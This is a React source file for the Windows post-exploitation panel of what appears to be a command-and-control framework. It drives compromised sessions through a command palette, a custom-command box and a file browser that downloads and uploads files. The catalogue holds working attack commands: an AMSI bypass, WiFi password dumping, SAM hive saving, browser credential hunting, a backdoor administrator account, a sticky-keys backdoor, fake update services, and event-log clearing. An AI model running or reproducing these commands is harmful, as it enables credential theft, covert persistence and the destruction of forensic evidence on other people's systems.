import { useState, useMemo, useRef, useEffect } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
  Download, Copy, CheckCheck, ChevronRight, ChevronDown,
  Search, Hash, Upload, X,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────
interface ExecResult  { stdout: string; stderr: string; exit_code: number }
interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp      { path: string; files: FileInfo[] }
interface Task        { id: number; cmd: string; result: string; ok: boolean; ts: number; open: boolean }

// ─── Helpers ─────────────────────────────────────────────────────────────────
function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
  return `${b} B`
}
function joinWin(base: string, name: string) {
  return base.replace(/[/\\]+$/, '') + '\\' + name
}
function parentWin(p: string) {
  const t = p.replace(/[/\\]+$/, '')
  const i = Math.max(t.lastIndexOf('\\'), t.lastIndexOf('/'))
  if (i <= 2) return t.slice(0, 3) // e.g. "C:\"
  return t.slice(0, i)
}

// ─── Command catalogue ────────────────────────────────────────────────────────
interface Cmd { icon: string; label: string; cmd: string; tag?: string }
interface Cat { id: string; icon: string; label: string; atkId: string; cmds: Cmd[] }

const CATS: Cat[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'whoami /all',          cmd: 'whoami /all',                                                    tag: 'T1033' },
      { icon: '💻', label: 'systeminfo',            cmd: 'systeminfo',                                                     tag: 'T1082' },
      { icon: '🔧', label: 'OS / Patches',          cmd: 'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief', tag: 'T1082' },
      { icon: '👥', label: 'Local Users',           cmd: 'net user',                                                       tag: 'T1087' },
      { icon: '🔑', label: 'Admins',                cmd: 'net localgroup administrators',                                  tag: 'T1069' },
      { icon: '📋', label: 'Processes',             cmd: 'tasklist /v',                                                    tag: 'T1057' },
      { icon: '⚙️', label: 'Running Services',      cmd: 'sc query type= all state= running',                              tag: 'T1007' },
      { icon: '📦', label: 'Installed Software',    cmd: 'wmic product get Name,Version /format:csv',                     tag: 'T1518' },
      { icon: '🔒', label: 'AV / EDR',              cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value', tag: 'T1518' },
      { icon: '📝', label: 'Recent Event Log',      cmd: 'wevtutil qe Security /c:10 /f:text /rd:true',                  tag: 'T1005' },
      { icon: '🔌', label: 'Autorun Keys',          cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Scheduled Tasks',       cmd: 'schtasks /query /fo list /v',                                   tag: 'T1053' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'Current Privileges',    cmd: 'whoami /priv',                                                   tag: 'T1134' },
      { icon: '🔑', label: 'Token / Groups',        cmd: 'whoami /groups /fo list',                                       tag: 'T1134' },
      { icon: '📂', label: 'Unquoted Svc Paths',    cmd: 'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "\\"',  tag: 'T1574' },
      { icon: '🔧', label: 'AlwaysInstallElev',     cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul', tag: 'T1548' },
      { icon: '🛡️', label: 'UAC Level',            cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA',    tag: 'T1548' },
      { icon: '📁', label: 'Writable Svc Dirs',     cmd: 'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do @icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a', tag: 'T1574' },
      { icon: '🔐', label: 'PS Exec Policy',        cmd: 'powershell -c "Get-ExecutionPolicy -List"',                     tag: 'T1059' },
      { icon: '💉', label: 'AMSI Bypass',           cmd: 'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); Write-Output \'AMSI bypassed\'"', tag: 'T1562' },
      { icon: '🎪', label: 'SeImpersonate (Potato)', cmd: 'whoami /priv | findstr SeImpersonatePrivilege',                tag: 'T1134' },
      { icon: '🔓', label: 'PS Bypass + Base64',    cmd: 'powershell -nop -enc SABpAGQAZABlAG4A',                         tag: 'T1059' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '📋', label: 'Stored Creds (cmdkey)', cmd: 'cmdkey /list',                                                   tag: 'T1552' },
      { icon: '📎', label: 'Clipboard',             cmd: 'powershell -c "Get-Clipboard"',                                 tag: 'T1115' },
      { icon: '🌐', label: 'WiFi Passwords',        cmd: 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")', tag: 'T1552' },
      { icon: '🦊', label: 'Firefox Profiles',      cmd: 'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul', tag: 'T1555' },
      { icon: '🌐', label: 'Chrome Login Data',     cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul',    tag: 'T1555' },
      { icon: '📧', label: 'Outlook Creds (reg)',   cmd: 'reg query "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles" /s 2>nul | findstr /i "server\\|user\\|pass"', tag: 'T1555' },
      { icon: '🔑', label: 'DPAPI Blobs',           cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul',                 tag: 'T1555' },
      { icon: '⚙️', label: 'Config / .env Files',   cmd: 'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".config .env .ini password secret"', tag: 'T1552' },
      { icon: '💀', label: 'SAM Hive (needs SYSTEM)', cmd: 'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM', tag: 'T1003' },
      { icon: '🕵️', label: 'LSASS PID',            cmd: 'tasklist | findstr lsass',                                       tag: 'T1003' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Config',             cmd: 'ipconfig /all',                                                  tag: 'T1016' },
      { icon: '🗺️', label: 'ARP Table',            cmd: 'arp -a',                                                         tag: 'T1016' },
      { icon: '🔌', label: 'Open Ports (netstat)',  cmd: 'netstat -ano',                                                   tag: 'T1049' },
      { icon: '🛤️', label: 'Routes',               cmd: 'route print',                                                    tag: 'T1016' },
      { icon: '🌍', label: 'DNS Cache',             cmd: 'ipconfig /displaydns',                                           tag: 'T1016' },
      { icon: '🏠', label: 'Hosts File',            cmd: 'type C:\\Windows\\System32\\drivers\\etc\\hosts',                tag: 'T1016' },
      { icon: '📁', label: 'SMB Shares',            cmd: 'net share && net view /all 2>nul',                               tag: 'T1135' },
      { icon: '🔥', label: 'Firewall Rules',        cmd: 'netsh advfirewall firewall show rule name=all | findstr /i "rule\\|enabled\\|action\\|direction" | head -40', tag: 'T1562' },
      { icon: '📡', label: 'Proxy Settings',        cmd: 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer 2>nul', tag: 'T1090' },
    ],
  },
  {
    id: 'files', icon: '📁', label: 'FILE SYSTEM', atkId: 'TA0009',
    cmds: [
      { icon: '🏠', label: 'Users Dir',             cmd: 'dir C:\\Users',                                                  tag: 'T1083' },
      { icon: '📝', label: 'Recent Docs',           cmd: 'dir /s /b C:\\Users\\*\\Recent 2>nul | head -20',               tag: 'T1083' },
      { icon: '🔍', label: 'Find Password Files',   cmd: 'dir /s /b C:\\ 2>nul | findstr /i "password pass secret cred" | head -20', tag: 'T1083' },
      { icon: '📄', label: 'Interesting Files',     cmd: 'dir /s /b C:\\Users 2>nul | findstr /i ".kdbx .pfx .pem .key .p12 .ovpn" | head -20', tag: 'T1005' },
      { icon: '💾', label: 'Shadow Copies',         cmd: 'vssadmin list shadows 2>nul',                                   tag: 'T1490' },
      { icon: '🌐', label: 'Web Config Files',      cmd: 'dir /s /b C:\\inetpub\\*web.config 2>nul & dir /s /b C:\\xampp\\*config* 2>nul', tag: 'T1005' },
      { icon: '📋', label: 'PowerShell History',    cmd: 'type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul', tag: 'T1552' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '📝', label: 'Run Keys (HKCU/HKLM)',  cmd: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Scheduled Tasks List',  cmd: 'schtasks /query /fo list /v | findstr "Task Name:\\|Status:\\|Run As User:"', tag: 'T1053' },
      { icon: '⚙️', label: 'New Sched Task',        cmd: 'schtasks /create /tn "WindowsUpdater" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru System /f 2>nul && echo created', tag: 'T1053' },
      { icon: '🌐', label: 'New Service',           cmd: 'sc create "WinUpdate" binpath= "C:\\Windows\\Temp\\update.exe" start= auto && sc start WinUpdate 2>nul', tag: 'T1543' },
      { icon: '👤', label: 'Add Backdoor User',     cmd: 'net user backd00r P@ssw0rd123! /add && net localgroup administrators backd00r /add && net localgroup "Remote Desktop Users" backd00r /add', tag: 'T1136' },
      { icon: '🔑', label: 'Sticky Keys Backdoor',  cmd: 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f', tag: 'T1546' },
      { icon: '📌', label: 'Startup Folder',        cmd: 'echo backdoor > "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat"', tag: 'T1547' },
      { icon: '🗑️', label: 'Clear Event Logs',     cmd: 'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'ad', icon: '🏰', label: 'ACTIVE DIRECTORY', atkId: 'TA0006',
    cmds: [
      { icon: '🏰', label: 'Domain Info',           cmd: 'nltest /domain_trusts 2>nul && net view /domain 2>nul',          tag: 'T1482' },
      { icon: '👑', label: 'Domain Admins',         cmd: 'net group "Domain Admins" /domain 2>nul',                        tag: 'T1069' },
      { icon: '🖥️', label: 'Domain Controllers',   cmd: 'nltest /dclist: 2>nul',                                          tag: 'T1018' },
      { icon: '🔍', label: 'AD Users',              cmd: 'net user /domain 2>nul',                                         tag: 'T1087' },
      { icon: '🎫', label: 'Kerberoast SPNs',       cmd: 'powershell -c "setspn -Q */*"',                                  tag: 'T1558' },
      { icon: '🔓', label: 'AS-REP Roastable',      cmd: 'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"', tag: 'T1558' },
      { icon: '🗂️', label: 'ADCS Certs',           cmd: 'certutil -CAInfo 2>nul',                                         tag: 'T1649' },
      { icon: '📋', label: 'GPO Result',            cmd: 'gpresult /R 2>nul',                                              tag: 'T1615' },
      { icon: '💰', label: 'DCSync Check',          cmd: 'powershell -c "([adsisearcher]\'(objectclass=domaindns)\').FindAll().Properties[\'Name\']"', tag: 'T1003' },
    ],
  },
]

// ─── Task counter ─────────────────────────────────────────────────────────────
let _tid = 0

// ─── Component ────────────────────────────────────────────────────────────────
interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function Windows({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const sessions = (data ?? []).filter(s => s.os?.toLowerCase().includes('windows'))

  const [selId,     setSelId]     = useState<string | null>(null)
  const [tasks,     setTasks]     = useState<Task[]>([])
  const [running,   setRunning]   = useState(false)
  const [custom,    setCustom]    = useState('')
  const [search,    setSearch]    = useState('')
  const [openCats,  setOpenCats]  = useState<Set<string>>(new Set(['recon']))
  const [showFs,    setShowFs]    = useState(false)
  const [copied,    setCopied]    = useState<number | null>(null)

  // file browser
  const [fsPath,    setFsPath]    = useState('C:\\')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)
  const uploadRef = useRef<HTMLInputElement>(null)

  const sel = sessions.find(s => s.id === selId) ?? null

  async function exec(cmd: string, label: string) {
    if (!selId || running) return
    setRunning(true)
    const id = ++_tid
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selId}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 8000)
      setTasks(p => [{ id, cmd: label, result: out, ok: r.exit_code === 0, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } catch (e) {
      setTasks(p => [{ id, cmd: label, result: String(e), ok: false, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } finally { setRunning(false) }
  }

  async function browseFs(path: string) {
    if (!selId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch { exec(`dir "${path}"`, `dir ${path}`) }
    finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selId) return
    window.open(`/api/sessions/${selId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  async function uploadFile(file: File) {
    if (!selId) return
    const form = new FormData()
    form.append('file', file)
    form.append('path', joinWin(fsPath, file.name))
    try {
      const res = await fetch(`/api/sessions/${selId}/upload`, { method: 'POST', body: form })
      if (!res.ok) throw new Error(await res.text())
      browseFs(fsPath)
    } catch (e) { alert(String(e)) }
  }

  function copy(id: number, text: string) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(id); setTimeout(() => setCopied(null), 1500)
    })
  }

  function toggleTask(id: number) {
    setTasks(p => p.map(t => t.id === id ? { ...t, open: !t.open } : t))
  }

  function toggleCat(id: string) {
    setOpenCats(prev => {
      const s = new Set(prev)
      s.has(id) ? s.delete(id) : s.add(id)
      return s
    })
  }

  const filteredCats = useMemo(() => {
    const q = search.trim().toLowerCase()
    if (!q) return CATS
    return CATS.map(c => ({ ...c, cmds: c.cmds.filter(cmd => cmd.label.toLowerCase().includes(q)) }))
               .filter(c => c.cmds.length > 0)
  }, [search])

  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')

  function selectSession(id: string) {
    setSelId(id); setTasks([]); setShowFs(false); setFsPath('C:\\'); setFsData(null)
  }

  return (
    <div className="flex h-full overflow-hidden rounded-lg border border-border bg-bg font-mono">

      {/* ══ COL 1 — Session List ══════════════════════════════════════════════ */}
      <aside className="w-48 shrink-0 flex flex-col border-r border-border" style={{ background: '#090909' }}>

        <div className="flex items-center justify-between px-3 py-2.5 border-b border-border">
          <span className="text-[10px] font-bold tracking-widest text-muted uppercase">Windows</span>
          <button onClick={refresh} className="text-muted hover:text-primary transition-colors" title="Refresh">
            <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto">
          {!loading && sessions.length === 0 && (
            <div className="p-4 text-center space-y-1">
              <Monitor size={20} className="text-border mx-auto" />
              <p className="text-muted text-[10px]">No Windows sessions</p>
            </div>
          )}
          {sessions.map(s => {
            const active = s.id === selId
            return (
              <button key={s.id}
                onClick={() => selectSession(s.id)}
                className={`w-full text-left px-3 py-2.5 border-b border-border/20 transition-all group ${
                  active ? 'bg-primary/8 border-l-2 border-l-primary' : 'hover:bg-white/4'
                }`}>
                <div className="flex items-center gap-1.5 mb-1">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${active ? 'bg-primary' : 'bg-muted'}`} />
                  <span className={`text-[11px] font-semibold truncate ${active ? 'text-text' : 'text-muted group-hover:text-text'}`}>
                    {s.hostname}
                  </span>
                </div>
                <div className="pl-3 space-y-0.5">
                  <div className="text-[9px] text-muted truncate">{s.username}</div>
                  <div className="text-[9px] text-muted truncate">{s.remote_address}</div>
                  <div className={`text-[9px] truncate ${active ? 'text-primary/70' : 'text-muted/60'}`}>{s.os} · {s.arch}</div>
                </div>
              </button>
            )
          })}
        </div>

        {error && <p className="px-2 py-1 text-[9px] text-danger">{error}</p>}
      </aside>

      {/* ══ COL 2 — Command Palette ══════════════════════════════════════════ */}
      {selId && (
        <div className="w-56 shrink-0 flex flex-col border-r border-border" style={{ background: '#0b0b0b' }}>

          {/* Target info */}
          <div className="px-3 py-2 border-b border-border">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-bold text-primary tracking-widest uppercase">Target</span>
              <button onClick={() => onOpenTerminal(selId, sel?.name || sel?.hostname || '')}
                className="flex items-center gap-1 text-muted hover:text-primary text-[9px] transition-colors">
                <Terminal size={9} /> Shell
              </button>
            </div>
            <div className="text-[10px] text-text font-semibold mt-0.5 truncate">{sel?.hostname}</div>
            <div className="text-[9px] text-muted truncate">{sel?.username} · {sel?.remote_address}</div>
          </div>

          {/* Search */}
          <div className="px-2 py-1.5 border-b border-border">
            <div className="flex items-center gap-1.5 bg-bg/60 border border-border rounded px-2 py-1">
              <Search size={10} className="text-muted shrink-0" />
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder="filter modules…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/60 outline-none min-w-0"
              />
              {search && (
                <button onClick={() => setSearch('')} className="text-muted hover:text-text shrink-0">
                  <X size={9} />
                </button>
              )}
            </div>
          </div>

          {/* Category accordion */}
          <div className="flex-1 overflow-y-auto">
            {filteredCats.map(cat => {
              const open = openCats.has(cat.id) || !!search.trim()
              return (
                <div key={cat.id}>
                  <button
                    onClick={() => !search.trim() && toggleCat(cat.id)}
                    className="w-full flex items-center gap-1.5 px-3 py-1.5 hover:bg-white/4 transition-colors group">
                    <span className="text-xs">{cat.icon}</span>
                    <span className="flex-1 text-[9px] font-bold tracking-widest text-muted group-hover:text-text uppercase text-left">{cat.label}</span>
                    <span className="text-[8px] text-muted/60 font-mono">{cat.atkId}</span>
                    {open
                      ? <ChevronDown size={9} className="text-muted shrink-0" />
                      : <ChevronRight size={9} className="text-muted shrink-0" />}
                  </button>

                  {open && cat.cmds.map(c => (
                    <button key={c.label}
                      disabled={running}
                      onClick={() => exec(c.cmd, c.label)}
                      className="w-full flex items-center gap-2 px-4 py-1.5 hover:bg-primary/8 transition-colors group disabled:opacity-40 text-left">
                      <span className="text-[11px] shrink-0">{c.icon}</span>
                      <span className="flex-1 text-[10px] text-muted group-hover:text-text transition-colors truncate">{c.label}</span>
                      {c.tag && <span className="text-[8px] text-muted/40 font-mono shrink-0">{c.tag}</span>}
                    </button>
                  ))}
                </div>
              )
            })}
          </div>

          {/* Custom command + file browser */}
          <div className="shrink-0 border-t border-border">
            <div className="flex items-center gap-1.5 px-2.5 py-2 border-b border-border/50">
              <span className="text-muted text-[10px] font-bold select-none shrink-0">C:\&gt;</span>
              <input
                value={custom}
                onChange={e => setCustom(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                placeholder="custom command…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/50 outline-none font-mono min-w-0"
              />
              <button
                onClick={() => { if (custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                disabled={running || !custom.trim()}
                className="text-muted hover:text-primary disabled:opacity-30 shrink-0">
                {running ? <Loader size={10} className="animate-spin" /> : <Send size={10} />}
              </button>
            </div>
            <button
              onClick={() => { setShowFs(true); if (!fsData) browseFs(fsPath) }}
              className={`w-full flex items-center gap-2 px-3 py-2 text-[10px] transition-colors ${
                showFs ? 'bg-primary/10 text-primary' : 'text-muted hover:text-text hover:bg-white/4'
              }`}>
              <FolderOpen size={11} />
              File Browser
            </button>
          </div>
        </div>
      )}

      {/* ══ COL 3 — Task Output / File Browser ══════════════════════════════ */}
      {selId ? (
        <div className="flex-1 flex flex-col min-w-0 min-h-0">

          {showFs ? (
            /* ── File Browser ──────────────────────────────────────────────── */
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border bg-surface/40">
                <FolderOpen size={11} className="text-primary shrink-0" />
                <span className="text-[10px] text-muted font-mono flex-1 truncate">{fsPath}</span>
                <button onClick={() => browseFs(parentWin(fsPath))} className="text-muted hover:text-text text-[10px] flex items-center gap-1 shrink-0">
                  <ChevronRight size={10} className="rotate-180" /> Up
                </button>
                <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary shrink-0">
                  <RefreshCw size={10} className={fsLoading ? 'animate-spin' : ''} />
                </button>
                <button onClick={() => uploadRef.current?.click()} className="text-muted hover:text-primary shrink-0" title="Upload">
                  <Upload size={10} />
                </button>
                <button onClick={() => setShowFs(false)} className="text-muted hover:text-text shrink-0">
                  <X size={10} />
                </button>
                <input ref={uploadRef} type="file" className="hidden" onChange={e => e.target.files?.[0] && uploadFile(e.target.files[0])} />
              </div>
              <div className="flex-1 overflow-y-auto text-[11px]">
                {fsLoading
                  ? <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
                  : fsFiles.length === 0
                  ? <div className="p-4 text-muted text-center text-xs">Empty directory</div>
                  : fsFiles.map(f => (
                  <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 border-b border-border/20 hover:bg-white/3 group">
                    <span className="shrink-0">{f.is_dir ? '📁' : '📄'}</span>
                    <button
                      onClick={() => f.is_dir && browseFs(joinWin(fsPath, f.name))}
                      className={`flex-1 text-left truncate text-[10px] ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
                      {f.name}
                    </button>
                    {!f.is_dir && <span className="text-[9px] text-muted shrink-0 tabular-nums">{fmtBytes(f.size)}</span>}
                    {!f.is_dir && (
                      <button onClick={() => downloadFile(joinWin(fsPath, f.name))}
                        className="text-muted hover:text-primary opacity-0 group-hover:opacity-100 transition-all shrink-0" title="Download">
                        <Download size={10} />
                      </button>
                    )}
                  </div>
                ))}
              </div>
            </div>
          ) : (
            /* ── Task History ──────────────────────────────────────────────── */
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border bg-surface/30">
                <div className="flex items-center gap-2">
                  <Hash size={11} className="text-muted" />
                  <span className="text-[10px] text-muted font-semibold uppercase tracking-wider">Task History</span>
                  {tasks.length > 0 && (
                    <span className="text-[9px] bg-border/60 text-muted px-1.5 py-0.5 rounded-full">{tasks.length}</span>
                  )}
                  {running && <Loader size={10} className="text-primary animate-spin" />}
                </div>
                {tasks.length > 0 && (
                  <button onClick={() => setTasks([])} className="text-[9px] text-muted hover:text-danger transition-colors">
                    Clear
                  </button>
                )}
              </div>

              <div className="flex-1 overflow-y-auto p-3 space-y-2">
                {tasks.length === 0 ? (
                  <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-16">
                    <div className="w-10 h-10 rounded-full border border-border flex items-center justify-center">
                      <Terminal size={18} className="text-border" />
                    </div>
                    <div className="text-muted text-xs">No tasks yet</div>
                    <div className="text-muted/60 text-[10px] max-w-xs">
                      Select a module from the command palette or type a custom command
                    </div>
                  </div>
                ) : tasks.map((t, i) => (
                  <div key={t.id} className={`border rounded overflow-hidden transition-all ${
                    t.ok ? 'border-border/60' : 'border-danger/30'
                  }`}>
                    {/* Task header */}
                    <button
                      onClick={() => toggleTask(t.id)}
                      className={`w-full flex items-center gap-2.5 px-3 py-2 text-left transition-colors ${
                        t.ok ? 'bg-surface/60 hover:bg-surface' : 'bg-danger/5 hover:bg-danger/8'
                      }`}>
                      <span className="text-[9px] text-muted/50 font-mono shrink-0 tabular-nums">
                        #{String(tasks.length - i).padStart(2, '0')}
                      </span>
                      <span className={`shrink-0 rounded px-1.5 py-0.5 text-[8px] font-bold tracking-wider ${
                        t.ok ? 'bg-primary/15 text-primary' : 'bg-danger/20 text-danger'
                      }`}>
                        {t.ok ? 'SUCCESS' : 'ERROR'}
                      </span>
                      <span className="flex-1 text-[10px] text-text font-semibold truncate">{t.cmd}</span>
                      <span className="text-[9px] text-muted shrink-0 tabular-nums">
                        {new Date(t.ts).toLocaleTimeString()}
                      </span>
                      <button
                        onClick={e => { e.stopPropagation(); copy(t.id, t.result) }}
                        className="text-muted hover:text-primary shrink-0 transition-colors">
                        {copied === t.id ? <CheckCheck size={10} /> : <Copy size={10} />}
                      </button>
                      {t.open
                        ? <ChevronDown size={10} className="text-muted shrink-0" />
                        : <ChevronRight size={10} className="text-muted shrink-0" />}
                    </button>

                    {/* Output */}
                    {t.open && (
                      <pre className="px-4 py-3 text-[10px] text-text/90 whitespace-pre-wrap break-all leading-relaxed max-h-72 overflow-y-auto bg-bg/80 border-t border-border/30">
                        {t.result}
                      </pre>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      ) : (
        /* ── No session selected ─────────────────────────────────────────── */
        <div className="flex-1 flex flex-col items-center justify-center gap-4 p-8 text-center">
          <div className="w-14 h-14 rounded-full border border-border flex items-center justify-center">
            <Monitor size={24} className="text-border" />
          </div>
          <div>
            <div className="text-muted text-sm font-semibold mb-1">No session selected</div>
            <div className="text-muted/60 text-xs max-w-xs leading-relaxed">
              Select a Windows target from the session list to begin post-exploitation
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
